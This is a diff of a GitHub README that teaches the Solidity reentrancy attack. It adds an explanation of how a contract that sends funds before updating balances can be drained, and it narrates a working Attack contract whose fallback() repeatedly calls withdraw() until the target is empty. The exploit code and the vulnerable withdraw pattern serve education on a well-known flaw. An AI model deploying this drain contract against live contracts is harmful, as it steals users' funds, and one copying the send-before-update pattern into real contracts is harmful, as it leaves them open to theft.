@@ -7,6 +7,10 @@ The Reentrancy attack is one of the most destructive attacks in the Solidity sma
 When the contract fails to update its state before sending funds, the attacker can continuously call the withdraw function to drain the contract’s funds. A famous real-world Reentrancy attack is the DAO attack which caused a loss of 60 million US dollars.
 
 ## 💻 How Does Reentracy Attack Work?
+In simple terms, a reentrancy attack occurs between two smart contracts, where an attacking smart contract exploits the code in a vulnerable contract to drain it of its funds. The exploit works by having the attacking smart contract repeatedly call the withdraw function before the vulnerable smart contract has had time to update the balance.
+
+This is only possible because of the order in which the smart contract is set up to handle transactions, with the vulnerable smart contract first checking the balance, then sending the funds, and then finally updating its balance. The time between sending the funds and updating the balance creates a window in which the attacking smart contract can make another call to withdraw its funds, and so the cycle continues until all the funds are drained.
+
 <img src='https://github.com/wasny0ps/Reentracy/blob/main/img/reentracy.png'>
 
 ## 🎬 Reentrancy Attack Scenario
@@ -85,8 +89,10 @@ contract BasicBank {
     }
 }
 ```
-## 🔎 Analyzing
-## 🕸 Attacking
+## 🔎 Analyze
+## 🕸 Attack
+
+Let's start with importing BasicBank.sol file which is in the same directory. After that, I create new BasicBank object named target and use ```constructor()``` function for which learn target contract address. Arrive second step, at least one ether must be deposited to make a transaction on the target contract.So, I had called deposit() function from target contract and withdrew it. Before attack function, we must add ```fallback()``` function. Shortly, fallback function only works when external payment comes into contract.
 ```
 //SPDX-License-Identifier: MIT
 pragma solidity 0.7.0;
@@ -94,15 +100,19 @@ pragma solidity 0.7.0;
 import './BasicBank.sol';
 
 contract Attack{
+
     BasicBank public target;
+    
     constructor(address payable _target){
         target = BasicBank4(_target);
     }
+    
     function attack() external payable{
         require(msg.value >= 1e18, "At least 1 ether");
         target.deposit{value: 1e18}();
         target.withdraw(1e18);
     }
+     
     fallback()external payable{
         if(address(target).balance >= 1e18){
             target.withdraw(1e18);
@@ -120,7 +130,7 @@ function withdraw(uint _amount) external payable {
         userFunds[msg.sender] -= _amount;
         msg.sender.call{value: _amount}("");
         userFunds[commissionCollector] += _amount/100;
-    }
+}
 ```
 
 
